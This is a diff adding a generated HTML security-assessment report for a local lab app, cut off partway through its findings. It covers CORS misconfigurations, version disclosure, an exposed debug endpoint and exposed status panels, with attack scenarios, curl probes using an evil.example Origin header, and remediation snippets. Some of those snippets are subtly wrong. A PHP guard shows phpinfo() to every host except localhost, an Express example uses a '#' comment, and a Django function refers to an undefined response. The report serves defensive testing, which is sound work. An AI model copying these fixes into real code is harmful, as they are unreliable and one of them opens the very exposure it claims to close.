@@ -1,0 +1,1646 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>redveil security assessment — Local Lab</title>
+<style>
+
+:root {
+  --bg: #ffffff;
+  --fg: #111827;
+  --muted: #6b7280;
+  --border: #e5e7eb;
+  --card-bg: #f9fafb;
+  --code-bg: #1f2937;
+  --code-fg: #f3f4f6;
+  --accent: #2563eb;
+  --link: #1d4ed8;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #0b0f19;
+    --fg: #e5e7eb;
+    --muted: #9ca3af;
+    --border: #1f2937;
+    --card-bg: #111827;
+    --code-bg: #030712;
+    --code-fg: #d1d5db;
+    --accent: #60a5fa;
+    --link: #93c5fd;
+  }
+}
+* { box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  padding: 0;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.5;
+}
+.container {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 2rem 1.5rem;
+}
+header.page-header {
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 1.5rem;
+  margin-bottom: 2rem;
+}
+header.page-header h1 {
+  margin: 0 0 0.5rem;
+  font-size: 1.75rem;
+}
+header.page-header .subtitle {
+  color: var(--muted);
+  font-size: 0.95rem;
+}
+.summary {
+  margin-bottom: 2rem;
+}
+.summary h2 {
+  margin-top: 0;
+}
+.badges {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+}
+.badge {
+  display: inline-flex;
+  align-items: baseline;
+  gap: 0.5rem;
+  color: #ffffff;
+  padding: 0.5rem 0.9rem;
+  border-radius: 0.375rem;
+  font-weight: 600;
+}
+.badge-count {
+  font-size: 1.5rem;
+}
+.badge-label {
+  font-size: 0.85rem;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.finding {
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  border-radius: 0.5rem;
+  padding: 1.5rem;
+  margin-bottom: 1.5rem;
+}
+.finding header {
+  margin-bottom: 1rem;
+}
+.finding-title {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  margin-bottom: 0.5rem;
+}
+.finding-title h3 {
+  margin: 0;
+  font-size: 1.2rem;
+}
+.sev-badge {
+  color: #ffffff;
+  padding: 0.25rem 0.6rem;
+  border-radius: 0.25rem;
+  font-size: 0.75rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.finding-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 1rem;
+  color: var(--muted);
+  font-size: 0.85rem;
+  margin-bottom: 0.5rem;
+}
+.meta-item code {
+  background: var(--code-bg);
+  color: var(--code-fg);
+  padding: 0.05rem 0.35rem;
+  border-radius: 0.2rem;
+  font-size: 0.85em;
+}
+.finding-target {
+  font-size: 0.9rem;
+  margin-bottom: 1rem;
+}
+.finding-target code {
+  background: var(--code-bg);
+  color: var(--code-fg);
+  padding: 0.1rem 0.4rem;
+  border-radius: 0.2rem;
+}
+.finding-body section {
+  margin-bottom: 1.25rem;
+}
+.finding-body h4 {
+  margin: 0 0 0.5rem;
+  font-size: 1rem;
+  color: var(--accent);
+}
+.finding-body h5 {
+  margin: 1rem 0 0.25rem;
+  font-size: 0.9rem;
+  text-transform: uppercase;
+  color: var(--muted);
+  letter-spacing: 0.05em;
+}
+.finding-body p {
+  margin: 0;
+  white-space: pre-wrap;
+}
+ol.attack-steps,
+ol.reproduction,
+ol.remediation {
+  padding-left: 1.5rem;
+  margin: 0.5rem 0;
+}
+ol.attack-steps li,
+ol.reproduction li,
+ol.remediation li {
+  margin-bottom: 0.4rem;
+}
+pre.code-block {
+  background: var(--code-bg);
+  color: var(--code-fg);
+  padding: 0.75rem;
+  border-radius: 0.3rem;
+  overflow-x: auto;
+  font-size: 0.85rem;
+  margin: 0.5rem 0;
+}
+pre.code-block code {
+  font-family: "SFMono-Regular", Menlo, Consolas, monospace;
+  background: none;
+  color: inherit;
+}
+details {
+  margin: 0.75rem 0;
+}
+details summary {
+  cursor: pointer;
+  padding: 0.25rem 0;
+  user-select: none;
+}
+ul.references {
+  padding-left: 1.5rem;
+  margin: 0.5rem 0;
+}
+ul.references a {
+  color: var(--link);
+  text-decoration: none;
+  word-break: break-all;
+}
+ul.references a:hover {
+  text-decoration: underline;
+}
+footer.page-footer {
+  border-top: 1px solid var(--border);
+  margin-top: 2rem;
+  padding-top: 1.5rem;
+  color: var(--muted);
+  font-size: 0.85rem;
+  text-align: center;
+}
+@media print {
+  body { background: #fff; color: #000; }
+  .finding { page-break-inside: avoid; border: 1px solid #ccc; }
+  pre.code-block { background: #f4f4f4; color: #000; border: 1px solid #ddd; }
+  details { open: true; }
+  details summary { color: #000; }
+}
+
+</style>
+</head>
+<body>
+<div class="container">
+<header class="page-header">
+<h1>redveil Security Assessment</h1>
+<div class="subtitle">Target: <strong>Local Lab</strong></div>
+<div class="subtitle">Generated: 2026-08-31T22:07:11.433934+00:00</div>
+<div class="subtitle">Findings: <strong>14</strong></div>
+</header>
+<section class="summary">
+<h2>Summary</h2>
+<div class="badges">
+<div class="badge" style="background:#b91c1c;"><span class="badge-count">1</span><span class="badge-label">Critical</span></div>
+<div class="badge" style="background:#ea580c;"><span class="badge-count">2</span><span class="badge-label">High</span></div>
+<div class="badge" style="background:#ca8a04;"><span class="badge-count">6</span><span class="badge-label">Medium</span></div>
+<div class="badge" style="background:#16a34a;"><span class="badge-count">4</span><span class="badge-label">Low</span></div>
+<div class="badge" style="background:#2563eb;"><span class="badge-count">1</span><span class="badge-label">Info</span></div>
+</div>
+</section>
+<section class="findings">
+<article class="finding" id="finding-WPOC-11749D">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ea580c;">High</span>
+<h3>CORS Origin Reflection Without Validation</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-11749D</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>OPTIONS http://127.0.0.1/api/data</code>
+<br><strong>Parameter:</strong> <code>Origin</code>
+<br><strong>Input used:</strong> <code>https://evil.example</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The server echoes whatever value the client sends in the `Origin` header back into `Access-Control-Allow-Origin`, with no allowlist check. This is functionally equivalent to setting the origin to `*` but also defeats the browser&#x27;s refusal to combine `*` with credentials — meaning a cross-origin attacker can read responses in the victim&#x27;s authenticated session.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Origin reflection is a common anti-pattern: the server reads the incoming `Origin` header and copies it verbatim into `Access-Control-Allow-Origin`. Without an allowlist check, this permits any origin. Because the browser sees a specific origin in ACAO (not `*`), it will honor `Access-Control-Allow-Credentials: true` and include cookies on the request. The result: an attacker-controlled page can issue credentialed XHR to your API and read the responses as if it were the legitimate origin.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker hosts https://evil.example</li>
+<li>JavaScript on evil.example issues a credentialed fetch to https://target.example/api/me with the victim&#x27;s cookies</li>
+<li>Browser sends the request with cookies; Origin: https://evil.example</li>
+<li>Server responds: `Access-Control-Allow-Origin: https://evil.example` and `Access-Control-Allow-Credentials: true`</li>
+<li>Browser permits evil.example to read the response, which contains the victim&#x27;s profile data</li>
+<li>Attacker exfiltrates the data — full account takeover if the response includes a session token</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Full cross-origin data theft from any authenticated endpoint that reflects origin. With credentialed requests honored, this is the practical equivalent of disabling the same-origin policy for those endpoints. Attackers can read PII, perform state-changing actions on behalf of the victim, and exfiltrate session tokens.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>2 evidence record(s). See <code>evidence/WPOC-11749D-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Steps to reproduce</h4>
+<ol class="reproduction">
+<li>Send an OPTIONS preflight to http://127.0.0.1:5000/api/data with Origin: https://evil.example.
+<pre class="code-block"><code>curl -X OPTIONS -H &#x27;Origin: https://evil.example&#x27; -H &#x27;Access-Control-Request-Method: GET&#x27; http://127.0.0.1:5000/api/data</code></pre>
+</li>
+<li>Observe Access-Control-Allow-Origin: https://evil.example
+</li>
+</ol>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Replace origin reflection with an explicit allowlist. Compare the incoming Origin against a hard-coded set of trusted origins and only set ACAO if it matches.</li>
+<li>Never reflect arbitrary input into security headers without validation. Treat Origin like any other user-supplied value: validate, then output.</li>
+<li>If multiple origins need access, return the specific matching origin per request (do not echo arbitrary input).</li>
+<li>Add `Vary: Origin` to prevent cache poisoning between origins.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+map $http_origin $cors_allow {
+    default &quot;&quot;;
+    &quot;https://app.example.com&quot; &quot;https://app.example.com&quot;;
+    &quot;https://admin.example.com&quot; &quot;https://admin.example.com&quot;;
+}
+add_header Access-Control-Allow-Origin $cors_allow always;
+add_header Vary &quot;Origin&quot; always;
+# NEVER: add_header Access-Control-Allow-Origin $http_origin;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+SetEnvIf Origin &quot;^https://(app|admin)\.example\.com$&quot; CORS_OK
+Header set Access-Control-Allow-Origin &quot;%{CORS_OK}e&quot; env=CORS_OK
+Header merge Vary &quot;Origin&quot;
+# NEVER: Header set Access-Control-Allow-Origin &quot;%{Origin}e&quot;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+const ALLOW = new Set([&#x27;https://app.example.com&#x27;]);
+app.use((req, res, next) =&gt; {
+  const origin = req.headers.origin;
+  if (origin &amp;&amp; ALLOW.has(origin)) {
+    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+    res.setHeader(&#x27;Vary&#x27;, &#x27;Origin&#x27;);
+  }
+  next();
+});
+# NEVER: res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, req.headers.origin);
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+ALLOW = {&#x27;https://app.example.com&#x27;}
+@app.after_request
+def cors(resp):
+    o = flask.request.headers.get(&#x27;Origin&#x27;)
+    if o in ALLOW:
+        resp.headers[&#x27;Access-Control-Allow-Origin&#x27;] = o
+        resp.headers[&#x27;Vary&#x27;] = &#x27;Origin&#x27;
+    return resp
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+def cors_allow(request):
+    origin = request.META.get(&#x27;HTTP_ORIGIN&#x27;)
+    if origin in ALLOWED_ORIGINS:
+        response[&#x27;Access-Control-Allow-Origin&#x27;] = origin
+        response[&#x27;Vary&#x27;] = &#x27;Origin&#x27;
+    return response
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/942.html" target="_blank" rel="noopener">CWE-942</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/346.html" target="_blank" rel="noopener">CWE-346</a></li>
+<li>OWASP A05:2021</li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a></li>
+<li><a href="https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny" target="_blank" rel="noopener">https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny</a></li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-05A92C">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#b91c1c;">Critical</span>
+<h3>Wildcard CORS Origin Combined With Credentials</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-05A92C</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>OPTIONS http://127.0.0.1/api/data</code>
+<br><strong>Parameter:</strong> <code>Origin</code>
+<br><strong>Input used:</strong> <code>https://evil.example</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The server sets both `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`. Modern browsers refuse to honor this combination, but misconfigured CDNs, reverse proxies, or non-browser clients can strip the wildcard check and treat the configuration as if any origin is allowed with credentials. This is a CRITICAL misconfiguration.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Per the CORS specification, the `*` wildcard is incompatible with `Access-Control-Allow-Credentials: true`. Browsers refuse to send or honor the response, returning a console error. However, middleware that strips the credentials header (or that does not know about the CORS spec — older proxies, CDNs in legacy mode, non-browser HTTP clients) may still apply the wildcard and successfully process credentialed requests. The result is the same as origin reflection but is harder to detect because the origin &#x27;mismatch&#x27; is invisible to the client.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Application behind a CDN that strips ACAO credentials mismatch checks (or a non-browser client like a mobile app using a WebView that doesn&#x27;t enforce the spec)</li>
+<li>Backend sets `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`</li>
+<li>Attacker hosts https://evil.example and uses a non-standard client or bypass to issue credentialed XHR</li>
+<li>CDN forwards the request with the victim&#x27;s cookies; backend responds with `*` and credentials</li>
+<li>Attacker reads the response</li>
+<li>Or simpler: the application is served from both a browser context (where the spec protects) and a non-browser context (where it doesn&#x27;t) — attacker exploits the latter</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Critical credentialed data exposure. When the spec is enforced the impact is reduced to a console error, but any environment where the spec is not enforced — a CDN, a proxy, an embedded WebView, a native mobile client — is exposed. This is a recurring real-world finding in bug bounty programs precisely because it survives the standard browser defenses.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>2 evidence record(s). See <code>evidence/WPOC-05A92C-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Steps to reproduce</h4>
+<ol class="reproduction">
+<li>Send an OPTIONS preflight to http://127.0.0.1:5000/api/data with Origin: https://evil.example.
+<pre class="code-block"><code>curl -X OPTIONS -H &#x27;Origin: https://evil.example&#x27; -H &#x27;Access-Control-Request-Method: GET&#x27; http://127.0.0.1:5000/api/data</code></pre>
+</li>
+<li>Observe Access-Control-Allow-Origin: *
+</li>
+</ol>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Replace `*` with an explicit allowlist of trusted origins.</li>
+<li>Audit the full stack — CDN, reverse proxy, load balancer — for places where the CORS spec enforcement is bypassed.</li>
+<li>If you need credentialed CORS, respond with the specific matching origin (after allowlist check) and set credentials to true only for that origin.</li>
+<li>Use Content-Security-Policy to further restrict which origins can frame or include your content.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+# NEVER do this:
+# add_header Access-Control-Allow-Origin &quot;*&quot; always;
+# add_header Access-Control-Allow-Credentials &quot;true&quot; always;
+# Use a specific origin instead:
+map $http_origin $cors_allow {
+    default &quot;&quot;;
+    &quot;https://app.example.com&quot; &quot;https://app.example.com&quot;;
+}
+add_header Access-Control-Allow-Origin $cors_allow always;
+add_header Access-Control-Allow-Credentials &quot;true&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+# Use SetEnvIf to restrict and never set ACAO to literal &quot;*&quot;
+SetEnvIf Origin &quot;^https://app\.example\.com$&quot; CORS_OK
+Header set Access-Control-Allow-Origin &quot;%{CORS_OK}e&quot; env=CORS_OK
+Header set Access-Control-Allow-Credentials &quot;true&quot; env=CORS_OK
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+const ALLOW = [&#x27;https://app.example.com&#x27;];
+app.use((req, res, next) =&gt; {
+  if (ALLOW.includes(req.headers.origin)) {
+    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, req.headers.origin);
+    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);
+    res.setHeader(&#x27;Vary&#x27;, &#x27;Origin&#x27;);
+  }
+  next();
+});
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+from flask_cors import CORS
+CORS(app, origins=[&#x27;https://app.example.com&#x27;], supports_credentials=True)
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+CORS_ALLOWED_ORIGINS = [&#x27;https://app.example.com&#x27;]
+CORS_ALLOW_CREDENTIALS = True  # with specific origins only
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/942.html" target="_blank" rel="noopener">CWE-942</a></li>
+<li>OWASP A05:2021</li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a></li>
+<li><a href="https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny" target="_blank" rel="noopener">https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny</a></li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-84EB7E">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ca8a04;">Medium</span>
+<h3>Version Disclosure in Server Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-84EB7E</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>server</code>
+<br><strong>Input used:</strong> <code>Werkzeug/3.1.8 Python/3.13.5</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The response includes a `Server` or `X-Powered-By` header that discloses the exact software version (e.g. `nginx/1.18.0`, `Express`, `PHP/7.4.3`). Public vulnerability databases index every version of every web server; advertising yours lets an attacker look up CVEs that match your stack without doing any reconnaissance themselves.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Web servers and frameworks often auto-add headers identifying themselves. `Server` is set by Apache, nginx, IIS. `X-Powered-By` is set by PHP, ASP.NET, Express. Exact version strings are even more valuable than names. Tools like Shodan, Censys, and vulnerability scanners ingest these headers at scale to build asset inventories and CVE match lists. Removing the version (or the header entirely) gives an attacker one more step to perform before they can target specific CVEs.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker runs a port scan on the target&#x27;s IP range</li>
+<li>Server responds with `Server: nginx/1.14.0`</li>
+<li>Attacker searches `https://vulners.com/search?query=nginx+1.14.0` and discovers CVE-2019-20372 (error_page request smuggling)</li>
+<li>Attacker checks the target&#x27;s exact version against the CVE&#x27;s affected list — match</li>
+<li>Attacker fires off the exploit without further recon</li>
+<li>Without the version, the attacker would have to fingerprint manually or try broader exploits</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Faster, more reliable target identification by adversaries. Specific CVEs can be matched to your stack without active probing. In large-scale attacks (botnets, worms), version-specific exploits are launched automatically. Disclosing versions also signals to attackers whether you&#x27;re running an outdated stack — a strong indicator of broader security hygiene issues.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-84EB7E-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Set `server_tokens off;` in nginx to remove the version from the Server header.</li>
+<li>In Apache, set `ServerTokens Prod` (and `ServerSignature Off`) to emit only `Server: Apache`.</li>
+<li>In Express, call `app.disable(&#x27;x-powered-by&#x27;)` to remove `X-Powered-By: Express`.</li>
+<li>In IIS, configure `removeServerHeader=true` via web.config.</li>
+<li>Strip or rewrite these headers at the reverse proxy as a defense-in-depth measure.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+server_tokens off;  # in http {} or server {} block
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+ServerTokens Prod
+ServerSignature Off
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+const app = express();
+app.disable(&#x27;x-powered-by&#x27;);
+</code></pre>
+<h5>iis</h5>
+<pre class="code-block"><code>
+&lt;!-- web.config --&gt;
+&lt;system.webServer&gt;
+  &lt;security&gt;
+    &lt;requestFiltering removeServerHeader=&quot;true&quot; /&gt;
+  &lt;/security&gt;
+&lt;/system.webServer&gt;
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+@app.after_request
+def strip_server(resp):
+    resp.headers.pop(&#x27;Server&#x27;, None)
+    resp.headers.pop(&#x27;X-Powered-By&#x27;, None)
+    return resp
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noopener">CWE-200</a></li>
+<li>OWASP A01:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-79FBB9">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ea580c;">High</span>
+<h3>Exposed Debug Endpoint</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-79FBB9</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/debug</code>
+<br><strong>Parameter:</strong> <code>body</code>
+<br><strong>Input used:</strong> <code>/debug</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>A debug endpoint (`/debug`, `/api/_debug`, `/admin/debug`) is reachable without authentication and returns runtime internals — Python version, Flask routes, environment variables, active sessions, sometimes even direct database access. Debug endpoints are intended for development and should never be exposed in production.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Debug endpoints are commonly added by frameworks in development mode (Flask `/debug`, Django Debug Toolbar) or by developers as a quick way to inspect application state. They return rich internal data: route maps, environment variables, request context, database queries, sometimes even admin actions. Werkzeug&#x27;s interactive debugger (when `debug=True`) is a remote code execution vulnerability if exposed — the debugger console accepts arbitrary Python code. Even non-interactive debug endpoints leak enough information to mount targeted attacks.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker runs a directory brute force and finds `/debug` returning 200</li>
+<li>Response contains the full route map (every URL the app serves), Flask version, all environment variables including API keys, and the Python version</li>
+<li>Attacker maps the route list to known CVEs for that framework version</li>
+<li>Attacker reads API keys from env vars and uses them to access the database, payment processor, or cloud provider</li>
+<li>With Werkzeug debug enabled, attacker executes arbitrary Python in the application context — full RCE</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Critical disclosure of internal state. At minimum, route maps and config reveal attack surface; at worst, exposed debug endpoints enable remote code execution (Werkzeug, Tornado, Rails `better_errors`). Even a benign debug page that returns request headers can leak Authorization tokens if a downstream service forwards them.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-79FBB9-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Remove or disable all debug endpoints in production: in Flask, `app.debug = False` and `use_debugger = False`.</li>
+<li>Add an environment-based guard: only register the debug blueprint when `app.config[&#x27;ENV&#x27;] == &#x27;development&#x27;`.</li>
+<li>Block access at the reverse proxy: `location /debug { deny all; }`.</li>
+<li>Audit route maps for `/debug`, `/_debug`, `/admin/debug`, `/__debug__`, and similar patterns.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>flask</h5>
+<pre class="code-block"><code>
+if app.config[&#x27;ENV&#x27;] == &#x27;development&#x27;:
+    from myapp.debug import debug_bp
+    app.register_blueprint(debug_bp)
+# Werkzeug debugger: never enable in production
+app.run(debug=False)
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+# settings.py
+DEBUG = False
+# Never install django-debug-toolbar in production
+# INSTALLED_APPS should not contain &#x27;debug_toolbar&#x27;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+if (process.env.NODE_ENV !== &#x27;production&#x27;) {
+  app.get(&#x27;/debug&#x27;, require(&#x27;./routes/debug&#x27;));
+}
+</code></pre>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+location ~ ^/(debug|_debug|admin/debug|__debug__) {
+    deny all;
+    return 404;
+}
+</code></pre>
+<h5>generic</h5>
+<pre class="code-block"><code>
+# CI check:
+grep -rn &#x27;app.run(.*debug&#x27; src/ &amp;&amp; exit 1
+grep -rn &#x27;/debug&#x27; src/routes/ &amp;&amp; exit 1
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noopener">CWE-200</a></li>
+<li>OWASP A01:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-E7D420">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ca8a04;">Medium</span>
+<h3>Exposed Management Panel</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-E7D420</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/server-status</code>
+<br><strong>Parameter:</strong> <code>body</code>
+<br><strong>Input used:</strong> <code>/server-status</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>A management or status panel (`/server-status`, `/server-info`, `/phpinfo.php`) is publicly accessible. These panels reveal active connections, request logs, server configuration, and loaded modules. Apache `server-status` is a frequent find — it lists every recent request including URLs that may not be linked from the main site.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Apache `mod_status` exposes `/server-status` showing recent requests, worker status, and connection counts. `/server-info` lists every loaded module with version info. PHP `phpinfo()` dumps every PHP setting, environment variable, and module — a goldmine for attackers. These endpoints are often enabled by default in development configurations and accidentally deployed to production.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker requests `/server-status` — Apache returns the last 100 requests including IPs, URLs, and user agents</li>
+<li>Attacker discovers URLs not linked anywhere on the site: `/admin/legacy-import`, `/internal/sync`, `/api/v2/debug`</li>
+<li>Attacker enumerates these hidden endpoints for further vulnerabilities</li>
+<li>`/phpinfo.php` reveals `DOCUMENT_ROOT`, `_SERVER[&#x27;SERVER_ADMIN&#x27;]`, the loaded PHP extensions and versions — direct CVE matching</li>
+<li>Attacker now has a complete map of the server&#x27;s attack surface</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Reconnaissance shortcut. Apache `server-status` lists recent requests including those to admin or internal endpoints. `phpinfo()` leaks the full PHP configuration including credentials, document root, and library versions. Once an attacker has these, every subsequent attack is targeted rather than blind.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-E7D420-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Disable Apache `mod_status` or restrict it to localhost: `&lt;Location /server-status&gt; Require ip 127.0.0.1 &lt;/Location&gt;`.</li>
+<li>Remove `phpinfo.php` from production; never deploy it.</li>
+<li>Block these paths at the reverse proxy: `location ~ ^/(server-status|server-info|phpinfo\.php) { deny all; }`.</li>
+<li>Audit your `httpd.conf` for `SetHandler server-status` and your codebase for `phpinfo()` calls.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>apache</h5>
+<pre class="code-block"><code>
+&lt;Location &quot;/server-status&quot;&gt;
+    SetHandler server-status
+    Require local  # or Require ip 127.0.0.1
+&lt;/Location&gt;
+&lt;Location &quot;/server-info&quot;&gt;
+    SetHandler server-info
+    Require local
+&lt;/Location&gt;
+</code></pre>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+location ~ ^/(server-status|server-info|phpinfo\.php) {
+    deny all;
+    return 404;
+}
+</code></pre>
+<h5>php</h5>
+<pre class="code-block"><code>
+# Search and remove phpinfo() calls:
+grep -rn &#x27;phpinfo()&#x27; src/ public/ &amp;&amp; exit 1
+# Or guard with:
+if (\$_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) { phpinfo(); }
+</code></pre>
+<h5>deployment</h5>
+<pre class="code-block"><code>
+# CI check: ensure phpinfo.php never lands in production
+test ! -f /var/www/html/phpinfo.php
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
